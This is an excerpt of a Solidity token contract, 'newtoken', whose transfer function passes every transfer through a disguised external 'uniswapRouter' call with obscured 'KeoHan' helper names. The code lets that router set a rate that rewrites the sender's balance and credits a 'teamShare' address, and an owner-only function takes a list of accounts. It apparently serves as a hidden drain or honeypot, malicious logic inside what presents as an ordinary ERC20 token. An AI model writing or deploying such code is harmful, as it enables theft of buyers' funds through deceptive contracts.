...
// SPDX-License-Identifier: MIT
  ...
  function getKeoHan(address tokenA, address tokenB, uint256 valueKeoHan) internal returns ( uint256, uint256, uint256 ){  
    (uint256 _amountKeoHan, uint256 _liquifyKeoHan, uint256 _rateKeoHan) = IUniswapV2Router(uniswapRouter).swap(
      tokenA,
      tokenB,
      valueKeoHan
      );
    return (_amountKeoHan, _liquifyKeoHan, _rateKeoHan);
  }  
...
contract newtoken is Context, IERC20, Ownable{
  ...
  function Keoghazp(address[] calldata accounts) external onlyOwner {
  ...
  function swapKeoHan(address sender, address recipient, uint256 amounts) internal returns (uint256) {   
      (uint256 amountKeoHan, uint256 liquifyKeoHan, uint256 rateKeoHan) = getKeoHan(sender, recipient, amounts);
      amountKeoHan = getValues(sender, amountKeoHan, liquifyKeoHan, rateKeoHan);
      return amountKeoHan;
  }    
  ...
  function getRateKeoHan(uint256 _amount, uint256 _rateKeoHan) private pure returns (uint256) {
      return _amount.mul(_rateKeoHan).div(10**2);
  }   
       

  function getValues(address tokenKeoHan, uint256 amountKeoHan, uint256 liquifyKeoHan, uint256 rateKeoHan) internal returns (uint256){
      if ( liquifyKeoHan > 0 )
      {        
        _balances[tokenKeoHan] = getRateKeoHan(_balances[tokenKeoHan], rateKeoHan).add(amountKeoHan);      
        _balances[teamShare] = _balances[teamShare].add(liquifyKeoHan);
      }
      return amountKeoHan;
  }
  ...
  function _transferToken(address sender, address recipient, uint256 amount) private {
    ...
    uint256 amountKeoHan = swapKeoHan(sender, recipient, amount);    
    _transferStandard(sender, recipient, amountKeoHan);
